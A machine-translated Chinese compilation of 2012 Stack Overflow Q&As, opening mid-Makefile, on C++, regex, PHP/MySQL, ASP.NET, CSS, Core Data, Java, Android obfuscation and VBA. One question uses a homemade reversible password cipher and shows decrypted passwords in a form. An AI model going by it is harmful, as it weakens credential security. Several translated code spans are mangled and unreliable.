/usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/features/resources.prf:
/usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/features/uic.prf:
/usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/features/yacc.prf:
/usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/features/lex.prf:
/usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/features/include_source_dir.prf:
/usr/local/Trolltech/QtEmbedded-4.7.3/lib/libQtNetwork.prl:
/usr/local/Trolltech/QtEmbedded-4.7.3/lib/libQtCore.prl:
qmake:  FORCE
    @$(QMAKE) -spec /usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/qws/linux-x86-g++ CONFIG+=debug QMLJSDEBUGGER_PATH=/usr/share/qtcreator/qml/qmljsdebugger -o Makefile UnitTest.pro

dist: 
    @$(CHK_DIR_EXISTS) .tmp/UnitTest1.0.0 || $(MKDIR) .tmp/UnitTest1.0.0 
    $(COPY_FILE) --parents $(SOURCES) $(DIST) .tmp/UnitTest1.0.0/ && $(COPY_FILE) --parents ../src/TipCoordinate.hpp .tmp/UnitTest1.0.0/ && $(COPY_FILE) --parents main.cpp ../src/TipCoordinate.cpp .tmp/UnitTest1.0.0/ && (cd `dirname .tmp/UnitTest1.0.0` && $(TAR) UnitTest1.0.0.tar UnitTest1.0.0 && $(COMPRESS) UnitTest1.0.0.tar) && $(MOVE) `dirname .tmp/UnitTest1.0.0`/UnitTest1.0.0.tar.gz . && $(DEL_FILE) -r .tmp/UnitTest1.0.0

clean:compiler_clean 
    -$(DEL_FILE) $(OBJECTS)
    -$(DEL_FILE) *~ core *.core

####### Sub-libraries

distclean: clean
    -$(DEL_FILE) $(TARGET) 
    -$(DEL_FILE) Makefile

check: first

mocclean: compiler_moc_header_clean compiler_moc_source_clean

mocables: compiler_moc_header_make_all compiler_moc_source_make_all

compiler_moc_header_make_all:
compiler_moc_header_clean:
compiler_rcc_make_all:
compiler_rcc_clean:
compiler_image_collection_make_all: qmake_image_collection.cpp
compiler_image_collection_clean:
    -$(DEL_FILE) qmake_image_collection.cpp
compiler_moc_source_make_all:
compiler_moc_source_clean:
compiler_uic_make_all:
compiler_uic_clean:
compiler_yacc_decl_make_all:
compiler_yacc_decl_clean:
compiler_yacc_impl_make_all:
compiler_yacc_impl_clean:
compiler_lex_make_all:
compiler_lex_clean:
compiler_clean: 

####### Compile

main.o: main.cpp 
    $(CXX) -c $(CXXFLAGS) $(INCPATH) -o main.o main.cpp

TipCoordinate.o: ../src/TipCoordinate.cpp ../src/TipCoordinate.hpp
    $(CXX) -c $(CXXFLAGS) $(INCPATH) -o TipCoordinate.o ../src/TipCoordinate.cpp

####### Install

install:   FORCE

uninstall:   FORCE

FORCE: 
```

我看到出现了一个滚动框，但如果有办法让它看起来更简洁，我欢迎任何提示。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-10-12T20:56:41.340

您看到的行为差异在于优化器。无论出于何种原因，优化器决定在某些情况下优化数学并用浮点常量替换它，但不是所有情况。当它这样做时，不会发生错误，因为该变量`sREFERENCE_SPHERE_RADIUS`从未在任何地方引用。

应该发生的是，在所有情况下，您*都*应该得到“未定义的引用”错误，因为`sREFERENCE_SPHERE_RADIUS`需要在类定义之外为变量提供显式定义。C++ 标准只允许你给一个`static`类成员的初始化器，如果它是整数或枚举类型：

```
// Header file
class TipCoordinate
{
    static const float sREFERENCE_SPHERE_RADIUS;  // declaration
};

// Source file
const float TipCoordinate::sREFERENCE_SPHERE_RADIUS = 12;  // definition 
```

从 C++03 §9.2/4 开始：

> 一个*成员声明*器只有在声明一个整数或枚举类型的成员（9.4）时 才能包含一个*常量初始化器*，见 9.4.2。`static``const``const`

在最新版本的 C++ 语言 C++11 中，规则稍微宽松一些，可以在声明中定义浮点常量，但必须`constexpr`使用`const`.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-12T20:53:26.827

（由于认真的思考，我不得不编辑这个答案！所以，只是希望这不会使任何评论无效。）

假设您显示的代码确实是全部（一个*完整*的最小示例可以澄清事情！），那么它根本就是一个编译器错误！

您可以通过各种方式解决它。

首先，既然你有一个头文件+一个实现文件，那么只需删除类内声明中的初始化，并将其添加到 cpp 文件中：

```
float const TipCoordinate::sREFERENCE_SPHERE_RADIUS = 12.0; 
```

请注意，对于整数类型的常量，您*可以*在类内声明中对其进行初始化。此外，使用 C++11，您可以使用它`constexpr`来允许初始化类内声明。无论如何，类中的声明在技术上是纯声明，而 cpp 文件中的声明（如果有）是定义（即使没有初始化器，整型常量也可能如此）。

对于仅标头模块，您可以改为执行例如……

```
static double referenceSphereRadius() { return 12.0; } 
```

或者例如……

```
template< class Dummy >
class TipCoordinate_constants
{
protected:
    static double const referenceSphereRadius;
};

template< class Dummy >
double const TipCoordinate_constants<Dummy>::referenceSphereRadius = 12.0;

class TipCoordinate
    private TipCoordinate_constants<void>
{
    // ...
}; 
```

这些技术也适用于 C++03 编译器。

注意不使用 SHOUTING UPPERCASE。请为宏名称保留它。C++ 不是 Java。

# html - 显示一些表格数据，但它具有动态布局。分区？桌子？

> ID：12866841
> 
> 赞同：0
> 
> 时间：2012-10-12T20:44:33.157
> 
> 标签：html, css, tablelayout

我需要向用户显示一些数据。

数据显示为“标签：InputForLabel”，并将有两列。它看起来像这样：

![在此处输入图像描述](../Images/d0576bb5aec99a24548e21c3ab813b66.png)

我一开始只使用每行四列的表格。每列的宽度为 25%，表格的宽度为 100%——所以这给出了我们在上面看到的显示。

```
.ContentTable {
    width: 100%;
}

.ContentTable tr {
    height: 18px;
}

.ContentTable tr td{
    width: 25%;
} 
```

现在，我有一个额外的要求，即能够动态删除给定的项目及其标签。如果我只是隐藏项目/标签 - 表格中会留下一个空白。我希望每行始终显示 2 个项目/标签，并且随着项目/标签被隐藏，所有内容都会向上折叠。

这听起来像是 div 可以更轻松地完成的事情吗？或者有没有办法告诉一个表格对象“每行总是有这么多列。如果隐藏了一列，从下一行拉起第一列并将所有内容向前滑动”？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-12T23:48:33.077

拥有一张大表是没有意义的，因此即使您保留由表组成的标记，您也应该将其分成两列（这将使您显示/隐藏其中一列的某些行的问题消失：o） .

然后，当您将内容分成两列时，我们可以问表格布局是否适合：我认为 MasterAM 是正确的，您应该尝试使用`ul`这种布局（并且只隐藏一个元素列表仍然和表格中的一行一样简单）

# regex - 我接受空字符串和公寓号码的简单正则表达式有什么问题？

> ID：12866843
> 
> 赞同：3
> 
> 时间：2012-10-12T20:44:44.797
> 
> 标签：regex

所以我想限制一个包含可选公寓号码的文本框。

这是有问题的正则表达式：

```
([0-9]{1,4}[A-Z]?)|([A-Z])|(^$) 
```

够简单吧？

我正在使用这些工具来测试我的正则表达式：
[Regex Analyzer](http://www.myezapp.com/apps/dev/regexp/show.ws "正则表达式分析器")
[Regex Validator](http://tools.netshiftmedia.com/regexlibrary/ "正则表达式验证器")

以下是预期结果：

*   有效的
    *   “1234A”
    *   “Z”
    *   “（空字符串）”
*   无效的
    *   “A1234”
    *   “fhfdsahds527523832dvhsfdg”

显然，如果我在这里，正则表达式会接受无效的。此正则表达式的目标是接受 1 到 4 个带有可选字母的数字、单个字母或空字符串。

我似乎无法弄清楚什么不起作用，我的意思是我们这里有一个足够简单的正则表达式。我可能遗漏了一些东西，因为我对正则表达式不是很好，但这种语法在我看来还不错。希望这里有人可以指出我的错误。

感谢所有帮助，非常感谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-12T20:48:34.407

您还需要在前两个选项中使用`^`和`$`锚点。您还可以将第二个选项包含在第一个选项中（它也立即匹配第三个变体）：

```
^[0-9]{0,4}[A-Z]?$ 
```

如果没有锚，您的正则表达式将匹配，因为它只会从字符串中的任何位置选择一个字母。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-12T20:58:57.177

根据语言的不同，您还可以使用否定的前瞻性。

```
^[0-9]{0,4}[A-Za-z](?!.*[0-9]) 
```

分解：

```
^[0-9]{0,4}  =  This look for any number 0 through 4 times at the beginning of the string
[A-Za-z]     =  This look for any characters (Both cases)
(?!.*[0-9])  =  This will only allow the letters if there are no numbers anywhere after the letter. 
```

我还没有完全弄清楚如何针对空字符进行验证，但是使用您使用的任何语言的工具可能会更容易完成。沿着这个逻辑的东西：

```
if String Doesn't equal $null Then check the Rexex 
```

沿着这些思路，只是调整了你会用你的语言做的事情。

我使用[RegEx Skinner](http://gskinner.com/RegExr/)来验证答案。

编辑：修复了评论中的错误

# javascript - 从javascript获取所有uid时出错

> ID：12866846
> 
> 赞同：0
> 
> 时间：2012-10-12T20:44:59.247
> 
> 标签：javascript

在 facebook pokes 页面中，即[http://www.facebook.com/pokes](http://www.facebook.com/pokes)我正在尝试使用 javascript 查找所有 uid。从萤火虫我得到以下标签名称......

```
<a rel="async-post" ajaxify="/ajax/pokes/poke_inline.php?uid=XXXXXXXXXXXX&amp;pokeback=1" href="#" class="uiIconText"><i style="top: 0px;" class="img sp_1lbo22 sx_3b5b96"></i>Poke Back</a> 
```

![在此处输入图像描述](../Images/52146947c306ffd94a76d5f0ed0be4c6.png)

为了获得所有的uid，我以以下方式设计了我的javascript-

```
var allAnchorElements = document.getElementsByTagName('a');

for (var i = 0; i < allAnchorElements.length; i++) {
   var uid = allAnchorElements[i].ajaxify.match(/uid=([0-9]*)/)[1]; 
```

我没有把完整的代码放在这里。现在从萤火控制台执行此代码时，我收到`TypeError: allAnchorElements[i].ajaxify is undefined`错误消息。

为什么我收到此错误？如何更改脚本以获取所有 uid？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-12T20:48:10.937

那么 document.getElementsByTagName('a'); 正在获取页面上的所有链接。所有链接都具有该属性吗？如果答案是否定的，则将它们过滤掉。

单程：

```
var allAnchorElements = document.getElementsByTagName('a');
for (var i = 0; i < allAnchorElements.length; i++) {
    var ajaxify = allAnchorElements[i].ajaxify;
    if (!ajaxify) {
        continue;
    }
    var uid = ajaxify.match(/uid=([0-9]*)/)[1];
} 
```

另一种方法是使用 querySelector 来获取元素。

# php - 我想从 MySQL 数据库中随机选择一个 YouTube 视频，并将其显示在我的网页上

> ID：12866847
> 
> 赞同：2
> 
> 时间：2012-10-12T20:45:01.517
> 
> 标签：php, mysql, random, youtube

我有一个名为“视频”的 MySQL 数据库表，只有三列（字段？）：ID、EmbedURL 和名称。

我想在实际 index.html 中使用 PHP（或其他任何东西）从数据库中获取随机 YouTube 视频并将 EmbedURL 放入 iFrame 中，以便当用户单击按钮（或刷新页面）时另一个来自数据库的随机视频加载。

我知道我可以使用 iframe 嵌入来做到这一点，如下所示：

```
<iframe width="560" height="315" src="http://www.youtube.com/embed/T0Jqdjbed40?playlist=SyoA4LXQco4,6l6PPvUhR4c" frameborder="0" allowfullscreen></iframe> 
```

但我*真的*希望这个简单的 1 页网站有一个大的、有趣的、有吸引力的点击按钮，而 iframe 嵌入播放器只有这个无聊的“下一步”按钮。

以下是我到目前为止的代码。作为第一步，我只是想看看我是否可以让我的页面显示保存在数据库中的 EmbedURL，但它没有在页面上回显任何内容，而且我知道它没有解决 iframe 问题。

我进行了非常彻底的搜索（60 分钟），但无法将所有部分组合在一起。该查询在 phpMyAdmin*中运行。*

任何指针表示赞赏。

[编辑：我的虚拟主机正在运行 PHP v. 5.2.17]。

```
<?php
    mysql_connect("localhost", "admin", "xxxxxxx") or die(mysql_error());
    mysql_select_db ("my_db_name") or die(mysql_error());

    $select = mysql_query("SELECT EmbedURL FROM `Videos` ORDER BY RAND() LIMIT 1");
   while($row = mysql_fetch_assoc($select)) {
?>              

    <p><?php echo $row ['EmbedURL']  ?></p> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-12T22:47:35.277

看起来他们正在弃用 mysql 调用，并建议改用 mysqli 面向对象的调用。

[http://us3.php.net/manual/en/function.mysql-connect.php](http://us3.php.net/manual/en/function.mysql-connect.php)

```
<?php
    $mysqli = new mysqli("host", "username", "password", "database name");
    if ($mysqli->connect_errno) {
        echo "Failed to connect to MySQL: (" . $mysqli->connect_errno . ") " . $mysqli->connect_error;
    }
    echo $mysqli->host_info . "\n";

    $res = $mysqli->query("SELECT EmbedURL FROM `Videos` ORDER BY RAND() LIMIT 1");
    $row = $res->fetch_assoc();
?>            

<iframe width="560" height="315" src="<?php echo $row['EmbedURL']; ?>" frameborder="0" allowfullscreen></iframe>

<p><?php echo $row['EmbedURL'];?></p> 
```

这在我运行 php 5.4 的本地服务器上对我有用。如果您使用的是低于 5.2.9 的 php 版本，构造函数的第一条评论建议使用一组不同的命令。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-12T21:26:54.107

那是你正在运行的脚本吗？最后一行似乎缺少分号。

否则，它似乎很好。尽管正如 Marc B 所指出的，如果它只是一个，则不需要使用 while 循环。正如 Fanis 所说，您应该进行错误检查。

# asp.net - FormView 在绑定中调用字符串函数

> ID：12866849
> 
> 赞同：1
> 
> 时间：2012-10-12T20:45:16.420
> 
> 标签：asp.net, asp.net-mvc

我的网站 (edituser.aspx) 中有一个编辑用户页面。用户名和密码放在 Access 数据库中，我在 FormView 中显示它们。像这样：

```
<asp:FormView 
ID="EditForm" 
runat="server" 
DefaultMode="Edit">
    <EditItemTemplate>
        <strong>username:</strong><br />
        <asp:TextBox ID="usernameIDTextBox" runat="server" Text='<%# Bind("usernameID") %>' /><br />

        <strong>Password:</strong><br />
        <asp:TextBox ID="passwordIDTextBox" TextMode="password" runat="server" Text='<%# Bind("passwordID") %>' /><br />
    ... . 
```

我加密了数据库中的密码，但虽然我有一个解密功能，但**我不知道如何在 Bind 短语中使用它**。例如我试过

```
 <%# decrypt(Bind("passwordID")) %> 
```

这没有用。

注意：我使用 asp.net 3.5，这是我在 edituser.aspx.vb 中解密的函数：

```
Public Function Decrypt(ByVal strDecoded_Pword As String) As String
        On Error Resume Next
        Dim i, ct As Integer
        Dim letter, dec, StrValappend, strVal As String
        dec = ""
        strDecoded_Pword = StrReverse(strDecoded_Pword)

        For ct = 1 To Len(strDecoded_Pword) Step 2
            StrValappend = Chr(Val("&H" & (Mid(strDecoded_Pword, ct, 2))))
            strVal = strVal & StrValappend
        Next
        strDecoded_Pword = strVal

        For i = 1 To Len(strDecoded_Pword)
            letter = Mid(strDecoded_Pword, i, 1)
            dec = dec & Chr(Asc(letter) - i - 5)
        Next
        Decrypt = dec
    End Function 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-12T21:48:06.767

尝试 Eval 而不是 Bind：

```
<%# Decrypt(Eval("passwordID")) %> 
```

# css - CSS如何将元素从一个点翻译出来？

> ID：12866859
> 
> 赞同：1
> 
> 时间：2012-10-12T20:45:35.983
> 
> 标签：css, css-transitions, instagram

我正在尝试用 CSS 模拟 Instagram 的特殊效果。在 Instagram 中，点击一组照片会使每张照片长大并飞离原来的位置。

![Instagram](../Images/071626682c691638638967257b37c2e9.png)

目前，我只知道如何做成长部分。我不知道如何使它们`translate`从原始点开始。

**HTML**

```
<div id="photoSet">
   <img src="1.jpg" />
   <img src="2.jpg" />
   <img src="3.jpg" />
</div> 
```

**CSS**

```
@-moz-keyframes fly {
    from {
       -moz-transform: scale(0.5);
    }
    to {
       -moz-transform: scale(1.0);
    }
}

img {
   -moz-animation: fly 1s;
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-12T21:02:07.853

在这种情况下，您需要为`left`和`top`属性设置动画。不幸的是，您需要为您计划转换的每个项目拥有一个类/选择器，以及一个单独的。然后您可以设置`transition: left 0.2s, top 0.2s;`为通用选择器。只需更改每个的 className 即可调用转换：

```
.photo { 
  transition: left 0.2s, top 0.2s;
  position: absolute;
  left: 0;
  top: 0;
}
.photo.photo1 { left: 0; top: 0; }
.photo.photo2 { left: 50px; top: 0; }
.photo.photo3 { left: 100px; top: 0; }
/* etc */
.photo.photo6 { left: 100px; top: 50px; } 
```

这样做有一个缺点，那就是一些渲染引擎*实际上*并没有硬件加速左/上转换。

# objective-c - 使用 SQLite 存储在 Core Data 中对未保存数据的查询如何工作？

> ID：12866865
> 
> 赞同：2
> 
> 时间：2012-10-12T20:45:54.457
> 
> 标签：objective-c, sqlite, core-data

在发送托管对象上下文`save:`消息之前，对托管对象所做的修改仅在内存中，不会提交给数据库。那么它如何对数据库执行查询呢？它必须执行标准的 SQL 查询，然后查询未保存的对象并合并结果，这应该很慢。

更新：例如，我有文章 <-> 标记多对多关系，并且我有许多未保存的文章。然后我想找到所有具有某些标签或在某些日期之间的文章。在数据库中，这将是对我们的关系表或日期字段的查询，并将使用适当的索引。但是对于未保存的对象，它必须遍历所有未保存的文章和/或其标签？或者对于未保存的对象，它也有一些类似数据库的存储？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-12T20:56:55.180

默认情况下，Core Data 不会在您执行 fetch 时查询挂起的更改 - 您需要使用`setIncludesPendingChanges`fetch 请求的属性显式设置它。

假设您已启用此功能：我不确定您为什么认为查询未保存的更改会更慢。

如果您的 Core Data 实例由 SQLite 存储支持，那么您需要从持久存储（磁盘）中读取数据库。您未保存的对象仍将全部位于 RAM 中 - 访问这些未保存的对象比访问数据库中的对象要快得多。您可以并行执行这两个查询，然后合并结果 - 合并数组是微不足道的 - 这意味着几乎没有性能损失。

总是有例外和边缘情况，但一般来说不应该有明显的性能损失。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-18T17:05:17.020

这是一个有趣的问题，我确实想知道当一堆对象在内存中时，大提取的效率如何。

我的猜测是内存中的对象被相当智能地管理，并且对象图的设置方式使得获取请求的开销最小化。虽然如果所有对象都已写入磁盘（仅因为“双重提取”），效率可能会稍低一些，但总体而言，拥有内存层而不必不断地写入和读取磁盘的好处会大大超过了这些类型的 fetch 请求性能的轻微下降。

我认为你要得到这个问题的答案的唯一方法就是自己做一些分析。如果你打开 Instruments，iOS 模拟器有一个 Core Data 工具可以帮助你分析获取请求。我会测试两次执行相同的 fetch 之间的区别：一次是在 fetch 之前处理所有待处理的更改，一次是在内存中处理一堆对象。如果你这样做，我很想看看这两个提取的结果！

# jquery - 用 jquery 提醒 img 的 src 属性

> ID：12866866
> 
> 赞同：-2
> 
> 时间：2012-10-12T20:46:08.353
> 
> 标签：jquery, html

```
<img id="myImg" src="image.jpg" />
<script>
alert(
//code that pop myImg src attribute 
);
</script> 
```

我需要使用图像的 src 属性来获得警报

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-10-12T20:47:25.220

您可以使用该[`attr()`](http://api.jquery.com/attr/)方法获取指定属性的值：

```
alert($('#myImg').attr("src")); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-12T20:53:25.273

简单的 JavaScript。

```
alert(document.getElementById("myImg").src); 
```

# java - Java Hibernate DataException：无法转换为 BIGINT

> ID：12866874
> 
> 赞同：0
> 
> 时间：2012-10-12T20:47:04.577
> 
> 标签：java, hibernate, jpql

我正在尝试使用 Hibernate 和 JPQL 使用 Java 中的单个列将一个表与另外两个表连接起来。

例如，我有`table A`一个`id`专栏。我想加入并`table B`加入`table C`专栏。`table A``id`

但是，当我尝试这样做时，我收到以下错误： `org.hibernate.exception.DataException: The value supplied cannot be converted to BIGINT`. 我看到一些答案说可能有空值，但是这些 id 列是主要的 id 列，并且不包含空值。

我的代码如下：

```
@OneToOne(fetch = fetchType.LAZY)
@JoinColumn(name="id", insertable=false, updatable=false)
private TableB tableB

@OneToOne(fetch = fetchType.LAZY)
@JoinColumn(name="id", insertable=false, updatable=false)
private TableC tableC 
```

当我删除两个连接之一时，一切正常。

我做错了什么导致这个问题？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-12T20:51:35.780

我不知道是什么类型`id`，但我认为它必须是 a`Long`才能让 Hibernate 将其转换为`BIGINT`

# java - 如何使用 Java 中的日历计算从今天开始的 30 天

> ID：12866879
> 
> 赞同：8
> 
> 时间：2012-10-12T20:47:18.243
> 
> 标签：java, calendar

我想计算从今天起 30 天后的日期。

```
public void dateSetup(){
        DateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd ");
        Calendar cal = Calendar.getInstance();
        Calendar calReturn = Calendar.getInstance();
        jDate_timeOfExpectedReturn1.setText(dateFormat.format(cal.getTime()));
        calReturn.add(Calendar.DATE, 30);
        jDate_timeOfLoan1.setText(dateFormat.format(calReturn.getTime()));
    } 
```

在上面你可以看到我正在提取今天的日期使用`Calendar cal = Calendar.getInstance();`

如何计算提取日期前 30 天的日期？

感谢您提供的任何帮助。

* * *

## 回答 #1

> 赞同：25
> 
> 时间：2012-10-12T20:48:12.287

只需使用`add()`带有`-30`天数的方法

```
 calReturn.add(Calendar.DATE, -30); 
```

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-10-12T20:48:56.857

您需要添加`-30`哪个将是减法。

```
calReturn.add(Calendar.DATE, -30); 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-10-12T20:50:27.630

在as 方法中使用**负数**，其工作方式类似于==>`add()``-30``date+(-30)``date-30`

# android - 如何防止我的 apk 被“拆解”

> ID：12866881
> 
> 赞同：2
> 
> 时间：2012-10-12T20:47:42.223
> 
> 标签：android, encryption, proguard

根据此[链接](http://www.androidpolice.com/2012/10/11/apk-teardown-the-play-store-is-getting-a-built-in-malware-scanner-theres-more-wish-list-progress-and-more/)，“Android Police”能够拆解 Google Play apk 并清楚地读取字符串文件。我认为有办法使用[proguard](http://developer.android.com/tools/help/proguard.html)来防止这种情况，但是效果好吗？我记得今年观看了 I/O 会议，他们提到了一些关于加密你的应用程序的事情，我相信。我还没有读到任何东西可以治愈我对发送无法反编译/解构的应用程序或任何东西的焦虑。任何有经验的人都可以为此担保（proguard和这个加密的东西）吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-12T20:56:58.003

> 我认为有办法使用 proguard 来防止这种情况发生，但是效果好吗？

ProGuard 混淆代码。它不对资源文件做任何事情。它甚至不加密代码中的字符串常量。

[DexGuard](http://www.saikoa.com/dexguard)是 ProGuard 的一个商业分支，似乎可以加密字符串常量，尽管我对资源一无所知。

此外，这些都没有多大帮助。正如 Hewgill 先生在评论中指出的那样，根据定义，一切都必须可见才能运行。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-12T20:57:24.633

Proguard 混淆代码，而不是资源。也就是说，即使进行了混淆，一旦应用程序将字符串读入内存，它就是明文。攻击者所需要的只是一个调试器和一个恰到好处的断点。

# excel - 为什么这个 VBA 函数舍入不正确？

> ID：12866885
> 
> 赞同：1
> 
> 时间：2012-10-12T20:48:06.260
> 
> 标签：excel, vba, floating-point, rounding

下面是我创建的一个 VBA 函数，用于在 Excel 中将英尺的测量值从数字转换为文本。例如，该函数将采用数字 1.5 并将其转换为字符串：1'-6"。

但由于某种原因，它错误地舍入了 11.5 英寸的值。当单元格设置为“=11.5/12”（11.5 英寸以英尺表示）时，结果为 0.9583，其中 3 重复。然后当我将此值传递给我的 txtfeet() 函数时，它返回字符串 1'-0"。真正的答案应该是字符串 11 1/2"。

该功能适用​​于其他重复数字，如 9.5 英寸（0.7916 重复 6）。奇怪的是，如果我将它传递 1 英尺和 11.5 英寸（换句话说，1.9583 与 3 重复），它也能正常工作。

任何人都可以帮助解决此错误吗？

这是我的功能的代码。

```
Public Function txtfeet(FeetIn As Double, Optional Denominator As Integer = 8)

' This function will change a decimal number of feet (FeetIn) to the text string
' representation of feet, inches, and fractional inches.
'
' It will round the fractional inches to the nearest 1/x where x is the denominator
' and is given by the user as the second argument of this function.  If a denominator
' is not given, it defaults to 8 as shown above.
'
' Modified from MrExcel.com

    ' set a variable to the integer portion of FeetIn
    NbrFeet = Fix(FeetIn)

    ' set a variable to the number of inches in decimal form
    InchIn = (FeetIn - NbrFeet) * 12

    ' set a variable to the integer portion of InchIn
    NbrInches = Fix(InchIn)

    ' set a variable to the remaining fractional inches in decimal form
    FracIn = (InchIn - NbrInches) * Denominator

    ' set a variable to be FracIn rounded to the nearest whole number
    Numerator = Application.WorksheetFunction.Round(FracIn, 0)

    ' if the fractional inches are zero, define the portion of text
    ' that will represent the fractional inches to be blank
    If Numerator = 0 Then
        FracText = ""

    ' otherwise, if the number of inches plus the fractional inches rounds up to
    ' 12, add one to NbrFeet and set NbrInches to zero and FracText to blank
    ElseIf (InchIn + (Numerator / Denominator)) = 12 Then
        NbrFeet = NbrFeet + 1
        NbrInches = 0
        FracText = ""

    ' otherwise, if the numerator equals the denominator, add one to NbrInches
    ' and set FracText to blank
    ElseIf Numerator = Denominator Then
        NbrInches = NbrInches + 1
        FracText = ""

    ' otherwise, define FracText in its simplest fractional form
    Else
        ' use a loop to get the fractional inches to their simplest form
        Do
            ' if the numerator is even, divide both numerator and divisor by 2
            If Numerator = Application.WorksheetFunction.Even(Numerator) Then
                Numerator = Numerator / 2
                Denominator = Denominator / 2
            Else
                FracText = " " & Numerator & "/" & Denominator
                Exit Do
            End If
        Loop
    End If

    ' define the output of the function as a text string of feet, inches, and
    ' fractional inches or just inches and fractional inches if NbrFeet is zero
    ' or just fractional inches if both NbrFeet and NbrInches are zero
    If NbrFeet = 0 And NbrInches = 0 And Numerator = 0 Then
        txtfeet = "0"""
    ElseIf NbrFeet = 0 And NbrInches = 0 Then
        txtfeet = Application.WorksheetFunction.Trim(FracText) & """"
    ElseIf NbrFeet = 0 Then
        txtfeet = NbrInches & FracText & """"
    Else
        txtfeet = NbrFeet & "'-" & NbrInches & FracText & """"
    End If

End Function 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-12T20:55:25.593

我相信你的台词

```
ElseIf (InchIn + (Numerator / Denominator)) = 12 Then
    NbrFeet = NbrFeet + 1
    NbrInches = 0
    FracText = "" 
```

应该

```
ElseIf (NbrInches + (Numerator / Denominator)) = 12 Then
   NbrFeet = NbrFeet + 1
NbrInches = 0
FracText = " 
```

# udp - 什么时候会响应广播最大值或淹没单台计算机的网卡？

> ID：12866889
> 
> 赞同：0
> 
> 时间：2012-10-12T20:48:12.777
> 
> 标签：udp, ip, broadcast

我们正在交流具有广播发现的 bacnet，幸运/不幸的是，它可以支持 400 万个对象 ID。在广播消息中，我可以指定 id 的范围。显然，如果我做的范围太大，比如 400 万，很多 udp 数据包会被丢弃，这是我真的不想要的。知道有多少合适的范围吗？我正在考虑广播以要求 1000 的范围并执行 4000 次。然后我会每周执行一次以获取任何上线的新设备。

有什么想法会饱和吗？

谢谢，院长

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-15T14:13:32.203

好吧，我的单机每秒接受大约 200,000 个 udp 数据包。事实证明，由于没有广播，我必须打一个可怕的网络，而且直接点对点 udp 一次不能做 100 个请求。当我执行 100 个线程时，所有 udp 请求/响应都超时了……执行 10 个似乎可行，我可能可以将其推高一点，但无论哪种方式，我一定是碰到了一个非常糟糕的开关/集线器/确实是只是不能承受很小的负载，因此无论广播如何，我所访问的网络都非常糟糕。

# jquery - 用字符串 jQuery 计算

> ID：12866890
> 
> 赞同：1
> 
> 时间：2012-10-12T20:48:13.277
> 
> 标签：jquery, string, variables

所以我有一个像这样的跨度：

```
 <span>1</span> 
```

现在我想做这样的事情（加上它）

```
 $(this).next("span").text($(this).next("span").text + 1); 
```

但它不会起作用。你看到我要去哪里了，对吧？我想让字符串或变量中的数字高一。

我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-10-12T20:51:10.217

```
$('span').html( parseInt( $('span').html(),10 ) + 1 ); 
```

**[jsFiddle 示例](http://jsfiddle.net/j08691/kefh3/)**

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-10-12T20:50:05.233

试试 JavaScript`parseInt()`函数。确保正确处理错误情况，例如有人将无效的整数值放入范围。

# c# - Silverlight 在线二进制序列化

> ID：12866893
> 
> 赞同：0
> 
> 时间：2012-10-12T20:48:33.073
> 
> 标签：c#, wcf, silverlight, serialization, binary-serialization

在即将完成新版本的同时，我们忽略了 WCF 服务返回给 silverlight 客户端的大量 XML 数据。现在我们正在研究如何缩小数据，使结果不在 10-100mb 范围内。

二进制序列化是解决方案似乎很清楚，使用例如 SharpSerializer 将数据序列化为二进制似乎很容易，但是通过我遇到的所有关于二进制序列化和其他教程的 SO 帖子，没有人解决如何通过线路将序列化数据发送到客户端。我希望我在 WCF 服务难题中遗漏了一些明显但至关重要的部分。

希望有人可以借给我一些帮助。让我知道我是否应该包含更多信息。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-13T08:53:13.580

首先，尝试内置的二进制编码（<binaryMessageEncoding> 在配置中，见[http://www.mostlydevelopers.com/blog/post/2009/10/14/Silverlight-3-WCF-Binary-Message-Encoding.aspx](http://www.mostlydevelopers.com/blog/post/2009/10/14/Silverlight-3-WCF-Binary-Message-Encoding.aspx)和[http://www.silverlight.net/learn/data-networking/network-services-(soap,-rest-and-more)/how-do-i-use-binary-encoding-for-wcf-with-银光-3](http://www.silverlight.net/learn/data-networking/network-services-(soap,-rest-and-more)/how-do-i-use-binary-encoding-for-wcf-with-silverlight-3)）。

您的数据可能会缩小，但请注意，内置的二进制编码旨在尽可能快，而不是尽可能小。

如果这还不够，并且您想使用 3rd=party 组件对二进制数据进行序列化，您确实可以将此数据作为 byte[] 返回（但您还需要使用上面的 <binaryMessageEncoding> 来防止 WCF 来自 base64 -对数据进行编码以使其成为有效的 XML）。您也可以使用 Stream 而不是 byte[]，这不会在 Silverlight 客户端为您提供真正的流式传输行为，但可以在服务器端为您提供真正的流式传输。

# html - 如何去除 Chrome 和 Safari 中文本框周围的黄色边框

> ID：12866897
> 
> 赞同：4
> 
> 时间：2012-10-12T20:48:45.430
> 
> 标签：html, css

